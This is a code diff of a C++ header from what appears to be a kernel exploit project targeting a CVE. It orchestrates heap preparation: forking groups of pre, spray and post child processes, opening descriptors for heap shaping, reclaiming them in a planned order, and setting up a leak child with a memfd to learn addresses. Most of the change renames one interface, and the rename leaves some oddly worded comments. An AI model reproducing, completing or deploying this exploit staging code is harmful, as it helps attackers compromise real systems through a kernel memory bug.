@@ -1,18 +1,18 @@
 #pragma once
 #include <cstdio>
 /** @file backend/cve_2026_43499/memory/prepare_page.hpp
- *  One page preparation: the twelve phases, in order, over two seams.
+ *  One page preparation: the twelve phases, in order, over two ops.
  *
  *  This file is where the decision pieces meet the kernel. It owns the order (read
  *  from prepare_steps), the sizes (from prepare_plan), the shape of the socket work
  *  (from shaping_plan), the closes (from reclaim_plan) and the alignment (from
- *  page_geometry), and it calls the platform through a seam so that a host test can
+ *  page_geometry), and it calls the platform through a landing so that a host test can
  *  drive the whole thing with fakes -- including the failure paths, which are the
  *  part of an orchestration most likely to be wrong and least likely to be exercised.
  *
  *  Two policies, not one. The address search is its own mechanism with its own
  *  geometry, lifecycle and waiting, so it is injected rather than folded into the
- *  seam: a fake search can be told to find nothing, which is how the no-collision
+ *  landing: a fake search can be told to find nothing, which is how the no-collision
  *  path is tested at all.
  *
  *  State lives on the caller's stack: this tree allows one mutable global and it is
@@ -28,7 +28,7 @@
 #include <cstdint>
 
 #include "backend/cve_2026_43499/memory/heap_geometry.hpp"
-#include "backend/cve_2026_43499/memory/heap_seam.hpp"
+#include "backend/cve_2026_43499/memory/heap_ops.hpp"
 #include "backend/cve_2026_43499/memory/prepare_plan.hpp"
 #include "backend/cve_2026_43499/memory/reclaim_plan.hpp"
 #include "backend/cve_2026_43499/memory/shaping_plan.hpp"
@@ -121,7 +121,7 @@ namespace ghostlock::backend::cve_2026_43499::memory {
 
     /** Run one preparation. See the file note for what is deliberately not in the
      *  sequence yet. */
-    template <HeapSeam Seam, AddressSnitch Snitch>
+    template <HeapOps Seam, AddressSnitch Snitch>
     [[nodiscard]] PrepareOutcome prepare_page(const PrepareInputs &inputs, const PageGeometry &geometry,
                                               const PreparePatience &patience, Snitch &snitch) noexcept;
 
@@ -147,7 +147,7 @@ namespace ghostlock::backend::cve_2026_43499::memory {
         inline constexpr std::size_t kSettleYields = 4U;
 
         /** Kill everything a preparation forked, in the order the retired tree used. */
-        template <HeapSeam Seam>
+        template <HeapOps Seam>
         void kill_children(PrepareState &state) noexcept {
             for (std::size_t i = 0U; i < state.pre; ++i) {
                 (void) Seam::stop_child(state.pre_pids[i]);
@@ -164,7 +164,7 @@ namespace ghostlock::backend::cve_2026_43499::memory {
         }
 
         /** Give every descriptor back, in the order the reclaim plan names. */
-        template <HeapSeam Seam>
+        template <HeapOps Seam>
         std::size_t close_them_all(PrepareState &state, const ReclaimCounts &counts,
                                   std::size_t *closed_pre = nullptr, std::size_t *closed_spray = nullptr,
                                   std::size_t *closed_post = nullptr) noexcept {
@@ -217,7 +217,7 @@ namespace ghostlock::backend::cve_2026_43499::memory {
         }
     }  // namespace detail
 
-    template <HeapSeam Seam, AddressSnitch Snitch>
+    template <HeapOps Seam, AddressSnitch Snitch>
     PrepareOutcome prepare_page(const PrepareInputs &inputs, const PageGeometry &geometry,
                                 const PreparePatience &patience, Snitch &snitch) noexcept {
         PrepareOutcome outcome{};
@@ -235,7 +235,7 @@ namespace ghostlock::backend::cve_2026_43499::memory {
             outcome.status = PrepareStatus::Refused;
             return outcome;
         }
-        const SeamResult page = Seam::page_size();
+        const OpsResult page = Seam::page_size();
         if (page.value <= 0) {
             outcome.status = PrepareStatus::CallFailed;
             outcome.error = page.error;
@@ -252,7 +252,7 @@ namespace ghostlock::backend::cve_2026_43499::memory {
         /* PreChildren then SprayChildren: fork, then that child's descriptor. */
         outcome.at_step = PrepareStep::PreChildren;
         for (std::size_t i = 0U; i < plan.pre_groups; ++i) {
-            const SeamResult child = Seam::fork_child();
+            const OpsResult child = Seam::fork_child();
             if (child.value == 0) {
                 /* In the child. Its work is not ported yet, and what it must not do is return
                  *  into the caller: a device run showed what that looks like -- the children ran
@@ -277,7 +277,7 @@ namespace ghostlock::backend::cve_2026_43499::memory {
         /* 退役 `pre_ctx`（spray 之后、snitch 之前 ✓）：整形泄漏落点 ⇒ 奇偶的直接来源 ✓。
          *  数量走文档（`heap.pre_shaped_groups` ✓）；为 0 时本相位不存在（与旧行为一致 ✓）。 */
         for (std::size_t i = 0U; i < plan.pre_shaped_groups; ++i) {
-            const SeamResult child = Seam::fork_child();
+            const OpsResult child = Seam::fork_child();
             if (child.value == 0) {
                 Seam::exit_child();
             }
@@ -295,7 +295,7 @@ namespace ghostlock::backend::cve_2026_43499::memory {
         }
         outcome.at_step = PrepareStep::SprayChildren;
         for (std::size_t i = 0U; i < plan.spray_groups; ++i) {
-            const SeamResult child = Seam::fork_child();
+            const OpsResult child = Seam::fork_child();
             if (child.value == 0) {
                 /* In the child. Its work is not ported yet, and what it must not do is return
                  *  into the caller: a device run showed what that looks like -- the children ran
@@ -327,7 +327,7 @@ namespace ghostlock::backend::cve_2026_43499::memory {
         }
         outcome.at_step = PrepareStep::PostChildren;
         for (std::size_t i = 0U; i < plan.post_groups; ++i) {
-            const SeamResult child = Seam::fork_child();
+            const OpsResult child = Seam::fork_child();
             if (child.value == 0) {
                 /* In the child. Its work is not ported yet, and what it must not do is return
                  *  into the caller: a device run showed what that looks like -- the children ran
@@ -349,7 +349,7 @@ namespace ghostlock::backend::cve_2026_43499::memory {
             ++state.post;
             if (state.post_fds[state.post - 1U] >= 0) { ++outcome.opened; ++outcome.opened_post; }
         }
-        const SeamResult leak_child = Seam::fork_child();
+        const OpsResult leak_child = Seam::fork_child();
         if (leak_child.value > 0) {
             state.leak_pid = static_cast<std::uint64_t>(leak_child.value);
             state.leak_fd = static_cast<std::int32_t>(Seam::open_memfd(state.leak_pid).value);
